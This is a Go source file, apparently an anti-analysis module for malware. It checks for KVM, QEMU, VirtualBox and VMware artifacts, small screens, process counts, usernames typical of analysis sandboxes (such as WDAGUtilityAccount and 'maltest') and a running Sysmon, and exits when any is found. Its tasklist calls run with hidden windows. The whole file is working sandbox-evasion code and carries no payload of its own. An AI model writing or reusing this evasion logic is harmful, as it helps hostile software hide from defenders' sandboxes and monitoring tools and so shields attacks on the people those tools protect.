package AntiDebugVMAnalysis

import (
	"bytes"
	"io/ioutil"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
)

func AntiVMCheckAndExit() {
	if kvmDetected, err := CheckForKVM(); kvmDetected || err != nil {
		log.Fatalf("VM detection failed: KVM detected or error occurred: %v", err)
	}

	if smallScreen, err := IsScreenSmall(); smallScreen || err != nil {
		log.Fatalf("VM detection failed: Small screen size or error occurred: %v", err)
	}

	if qemuDetected, err := CheckForQEMU(); qemuDetected || err != nil {
		log.Fatalf("VM detection failed: QEMU detected or error occurred: %v", err)
	}

	if taskCheckFailed, err := TaskCheck(); taskCheckFailed || err != nil {
		log.Fatalf("VM detection failed: Suspicious task activity or error occurred: %v", err)
	}

	if blacklistedNameDetected := CheckForBlacklistedNames(); blacklistedNameDetected {
		log.Fatalf("VM detection failed: Blacklisted username detected")
	}

	if vmArtifactsDetected := VMArtifactsDetect(); vmArtifactsDetected {
		log.Fatalf("VM detection failed: VM-related artifacts detected")
	}

	if sysmonRunning := CheckForSysmon(); sysmonRunning {
		log.Fatalf("VM detection failed: Sysmon is running")
	}
}

func CheckForKVM() (bool, error) {
	badDrivers := []string{"balloon.sys", "netkvm.sys", "vioinput", "viofs.sys", "vioser.sys"}
	systemRoot := os.Getenv("SystemRoot")

	for _, driver := range badDrivers {
		matches, err := filepath.Glob(filepath.Join(systemRoot, "System32", driver))
		if err != nil {
			log.Printf("Error accessing system files for %s: %v", driver, err)
			continue
		}
		if len(matches) > 0 {
			return true, nil
		}
	}
	return false, nil
}

func IsScreenSmall() (bool, error) {
	getSystemMetrics := syscall.NewLazyDLL("user32.dll").NewProc("GetSystemMetrics")
	width, _, _ := getSystemMetrics.Call(0)
	height, _, _ := getSystemMetrics.Call(1)

	return width < 800 || height < 600, nil
}

func CheckForQEMU() (bool, error) {
	qemuDrivers := []string{"qemu-ga", "qemuwmi"}
	system32Path := filepath.Join(os.Getenv("SystemRoot"), "System32")

	files, err := ioutil.ReadDir(system32Path)
	if err != nil {
		return false, err
	}

	for _, file := range files {
		for _, driver := range qemuDrivers {
			if strings.Contains(file.Name(), driver) {
				return true, nil
			}
		}
	}
	return false, nil
}

func TaskCheck() (bool, error) {
	cmd := exec.Command("tasklist")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err != nil {
		log.Printf("Error running tasklist command: %v", err)
		return false, err
	}

	processCounts := make(map[string]int)
	for _, line := range strings.Split(out.String(), "\n") {
		fields := strings.Fields(line)
		if len(fields) > 0 {
			processName := fields[0]
			if processName != "svchost.exe" {
				processCounts[processName]++
			}
		}
	}

	for _, count := range processCounts {
		if count > 60 {
			return true, nil
		}
	}
	return false, nil
}

func CheckForBlacklistedNames() bool {
	blacklistedNames := []string{
		"Johnson", "Miller", "malware", "maltest", "CurrentUser", "Sandbox", "virus", "John Doe",
		"test user", "sand box", "WDAGUtilityAccount", "Bruno", "george", "Harry Johnson",
	}
	username := strings.ToLower(os.Getenv("USERNAME"))

	for _, name := range blacklistedNames {
		if username == strings.ToLower(name) {
			return true
		}
	}
	return false
}

func VMArtifactsDetect() bool {
	badFiles := []string{"VBoxMouse.sys", "VBoxGuest.sys", "VBoxSF.sys", "VBoxVideo.sys", "vmmouse.sys", "vboxogl.dll"}
	badDirs := []string{`C:\Program Files\VMware`, `C:\Program Files\oracle\virtualbox guest additions`}
	system32Path := filepath.Join(os.Getenv("SystemRoot"), "System32")

	files, err := ioutil.ReadDir(system32Path)
	if err != nil {
		log.Printf("Error accessing System32 folder: %v", err)
		return false
	}

	for _, file := range files {
		fileName := strings.ToLower(file.Name())
		for _, badFile := range badFiles {
			if fileName == strings.ToLower(badFile) {
				return true
			}
		}
	}

	for _, badDir := range badDirs {
		if _, err := os.Stat(badDir); err == nil {
			return true
		}
	}

	return false
}

func CheckForSysmon() bool {
	cmd := exec.Command("tasklist")
	var out bytes.Buffer
	cmd.Stdout = &out
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}

	err := cmd.Run()
	if err != nil {
		log.Printf("Error running tasklist command: %v", err)
		return false
	}

	return strings.Contains(out.String(), "sysmon.exe")
}
